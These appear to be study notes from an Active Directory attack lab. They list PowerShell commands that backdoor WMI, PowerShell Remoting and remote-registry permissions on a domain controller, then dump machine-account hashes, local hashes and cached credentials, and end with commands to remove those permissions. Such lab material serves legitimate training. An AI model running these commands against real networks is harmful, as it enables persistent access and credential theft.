**On remote machine for student1** 

> **Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose**
> 

> **Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc  -Credential Administrator –namespace 'root\cimv2' -Verbose**
> 

**💡 If you want to execute WMI queries on the DC for code execution, yon need DA privs to modify the security descriptors of the domain controller.**

**◾ Modify PowerShell Remoting security descriptors of a machine you have administrative control on.**

**Tool #1 Race:**

**On local machine**

> **Set-RemotePSRemoting -UserName student1 -Verbose**
> 

**On remote machine for student1**

> **Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc  -Verbose**
> 

**◾ Retrieve the machine account has without DA privileges**

**Retrieve machine account hash:**

> **Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose**
> 

**Retrieve local account hash:**

> **Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose**
> 

**Retrieve domain cached credentials:**

> **Get-RemoteCachedCredential -ComputerName dcorp-dc  -Verbose**
> 

**Retrieve machine account hash without DA. modify permissions on the DC first**

> **Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local  -Trustee studentx -Verbose**
> 

**❌ Remove Permissions from a remote machine**

- **WMI**
    
    > **Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc  –namespace 'root\cimv2' -Remove  -Verbose**
    > 
    
- **PSRemoting**
    
    > **Set-RemotePSRemoting -UserName student1 -ComputerName  dcorp-dc -Remove**
    > 
    

 ****
